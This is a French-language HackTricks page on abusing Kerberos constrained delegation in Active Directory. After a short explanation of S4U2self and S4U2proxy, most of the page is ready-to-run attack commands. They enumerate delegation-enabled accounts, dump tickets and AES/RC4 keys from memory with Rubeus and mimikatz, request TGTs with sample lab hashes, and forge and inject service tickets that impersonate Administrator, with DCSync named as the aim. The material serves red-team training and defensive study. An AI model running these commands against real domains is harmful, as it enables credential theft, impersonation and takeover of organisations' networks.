# Délégation Contraignante

{{#include ../../banners/hacktricks-training.md}}

## Délégation Contraignante

En utilisant cela, un administrateur de domaine peut **permettre** à un ordinateur de **se faire passer pour un utilisateur ou un ordinateur** contre un **service** d'une machine.

- **Service pour l'utilisateur lui-même (**_**S4U2self**_**):** Si un **compte de service** a une valeur _userAccountControl_ contenant [TRUSTED_TO_AUTH_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D), alors il peut obtenir un TGS pour lui-même (le service) au nom de tout autre utilisateur.
- **Service pour l'utilisateur Proxy(**_**S4U2proxy**_**):** Un **compte de service** pourrait obtenir un TGS au nom de tout utilisateur pour le service défini dans **msDS-AllowedToDelegateTo.** Pour ce faire, il a d'abord besoin d'un TGS de cet utilisateur à lui-même, mais il peut utiliser S4U2self pour obtenir ce TGS avant de demander l'autre.

**Remarque**: Si un utilisateur est marqué comme ‘_Le compte est sensible et ne peut pas être délégué_’ dans AD, vous **ne pourrez pas vous faire passer** pour lui.

Cela signifie que si vous **compromettez le hash du service**, vous pouvez **vous faire passer pour des utilisateurs** et obtenir **l'accès** en leur nom au **service configuré** (possible **privesc**).

De plus, vous **n'aurez pas seulement accès au service que l'utilisateur peut imiter, mais aussi à tout service** car le SPN (le nom du service demandé) n'est pas vérifié, seulement les privilèges. Par conséquent, si vous avez accès au **service CIFS**, vous pouvez également avoir accès au **service HOST** en utilisant le drapeau `/altservice` dans Rubeus.

De plus, **l'accès au service LDAP sur DC** est ce qui est nécessaire pour exploiter un **DCSync**.
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> Il existe **d'autres moyens d'obtenir un ticket TGT** ou le **RC4** ou **AES256** sans être SYSTEM sur l'ordinateur, comme le bug de l'imprimante et la délégation non contrainte, le relais NTLM et l'abus du service de certificats Active Directory.
>
> **Avec ce ticket TGT (ou haché), vous pouvez effectuer cette attaque sans compromettre l'ensemble de l'ordinateur.**
```bash:Using Rubeus
#Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

#Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the Constained allowed user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**Plus d'informations sur ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)

{{#include ../../banners/hacktricks-training.md}}
